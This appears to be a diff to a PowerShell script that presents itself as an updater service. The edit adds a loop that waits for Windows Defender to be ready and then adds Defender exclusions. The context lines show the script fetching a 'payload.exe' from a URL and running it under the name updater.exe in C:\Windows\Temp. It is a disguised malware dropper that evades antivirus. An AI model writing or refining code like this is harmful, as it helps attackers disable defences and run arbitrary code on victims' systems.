@@ -27,10 +27,36 @@ if (Is-Admin) {
     # This block should ideally not be hit if UpdaterSrv runs as LocalSystem.
 }
 
-# --- NEW ADDITION: Introduce a delay to allow Defender to fully initialize ---
-Add-Content -Path $logPath -Value "Delaying execution for 45 seconds to allow Windows Defender to initialize..."
-Start-Sleep -Seconds 45 # You can adjust this duration if needed (e.g., 30 or 60 seconds)
-Add-Content -Path $logPath -Value "Delay finished. Proceeding with Defender exclusions."
+# --- START: Adaptive Wait for Windows Defender Service to be ready ---
+Add-Content -Path $logPath -Value "Waiting for Windows Defender service to be fully ready before adding exclusions..."
+$maxAttempts = 20 # Check up to 20 times (20 * 5 seconds = 100 seconds max wait)
+$delayBetweenChecks = 5 # seconds between each check
+
+for ($i = 0; $i -lt $maxAttempts; $i++) {
+    try {
+        # Check if the WinDefend service is running and Real-time Protection is enabled
+        $defenderService = Get-Service -Name WinDefend -ErrorAction Stop
+        $mpStatus = Get-MpComputerStatus -ErrorAction SilentlyContinue
+
+        if ($defenderService.Status -eq 'Running' -and $mpStatus.RealTimeProtectionEnabled -eq $true) {
+            Add-Content -Path $logPath -Value "Windows Defender service is running and Real-time Protection is enabled."
+            break # Exit loop if Defender is ready
+        }
+    } catch {
+        # Catch errors if service isn't found or Get-MpComputerStatus fails
+        Add-Content -Path $logPath -Value "Attempt $($i+1): Defender service not yet found or ready. Error: $_. Waiting..."
+    }
+    
+    # If not ready, wait and try again
+    Start-Sleep -Seconds $delayBetweenChecks
+
+    if ($i -eq ($maxAttempts - 1)) {
+        # This is the last attempt, log a warning if still not ready
+        Add-Content -Path $logPath -Value "WARNING: Max attempts reached. Defender may not be fully ready. Proceeding with exclusions anyway."
+    }
+}
+Add-Content -Path $logPath -Value "Finished adaptive wait. Proceeding with Defender exclusions."
+# --- END: Adaptive Wait ---
 
 # --- Add Windows Defender Exclusions ---
 Add-Content -Path $logPath -Value "Attempting to add Windows Defender exclusions."
@@ -74,7 +100,7 @@ foreach ($excl in $exclusions) {
 Add-Content -Path $logPath -Value "Finished attempting to add Windows Defender exclusions."
 
 # --- Fetch and Execute Payload ---
-$payloadUrl = "https://mywebsite.com/payload.exe" # <-- REMINDER: REPLACE WITH YOUR ACTUAL PAYLOAD URL
+$payloadUrl = "https://mywebsite.com/payload.exe" # <-- IMPORTANT: REPLACE WITH YOUR ACTUAL PAYLOAD URL
 $payloadPath = "C:\Windows\Temp\updater.exe"
 
 Add-Content -Path $logPath -Value "Attempting to fetch and execute payload from $payloadUrl."
